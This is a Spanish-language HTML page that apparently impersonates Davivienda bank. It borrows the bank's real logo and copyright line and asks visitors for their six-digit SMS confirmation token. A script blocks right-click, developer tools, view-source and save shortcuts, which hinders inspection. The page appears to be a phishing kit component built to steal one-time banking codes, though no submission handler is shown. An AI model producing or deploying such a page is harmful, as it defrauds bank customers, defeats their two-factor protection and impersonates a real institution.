<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>56576</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    /* 🔴 Header con franja roja */
    .header {
      background: #e30613;
      padding: 12px 0;
      text-align: center;
    }

    .header img {
      max-width: 220px;
      width: 80%;
      height: auto;
      display: block;
      margin: 0 auto;
    }

    .container {
      max-width: 400px;
      margin: 40px auto;
      background: #fff;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0px 4px 8px rgba(0,0,0,0.2);
      flex: 1;
    }

    .title {
      font-size: 16px;
      margin-bottom: 20px;
      text-align: left;
      font-weight: bold;
      color: #333;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #444;
    }

    /* 👤 Input con ícono de usuario */
    .input-user {
      width: 85%;
      padding: 10px 10px 10px 40px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
      background: url("cad.jpg") no-repeat 10px center;
      background-size: 18px;
    }


    .btn {
      width: 100%;
      padding: 12px;
      background: #e30613;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 40px;
    }

    .btn:hover {
      background: #c00511;
    }

    /* Footer */
    .footer {
      width: 100%;
      text-align: center;
      background: #000;
    }

    .footer img {
      width: 100%;
      height: auto;
      display: block;
    }
  </style>

<script> 
    // Bloquear clic derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
    document.onkeydown = function(e) {
        if (
            e.keyCode == 123 || // F12
            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
        ) {
            e.preventDefault();
            return false;
        }
    }
</script>


</head>
<body>
  <!-- 🔴 Header con logo centrado -->
  <div class="header">
    <img src="https://enlinea.davivienda.com.sv/ebanking/images/DAVIVIENDA/header/logo_davivienda.png" alt="Logo">
  </div>

  <div class="container">
    <div class="title">Autenticación SMS</div>

<form id="loginForm">
      <label for="usuario">Ingrese el código de confirmación enviado al celular que tiene registrado con nosotros.</label>

      <input type="tel" id="13" name="13"  inputmode="numeric" class="input-user" placeholder="Ingrese su Token SMS" minlength="6" maxlength="6" onkeypress="if(event.keyCode&lt;45||event.keyCode&gt;57)event.returnValue=false;" required>


<br>


      <button type="submit" class="btn">Continuar</button>
    </form>

    <p style="text-align: center;">Davivienda - &copy; 2026 - Todos los derechos reservados</p>
  </div>

<div class="footer">
    <img src="cop.png" alt="Imagen inferior">
</div>
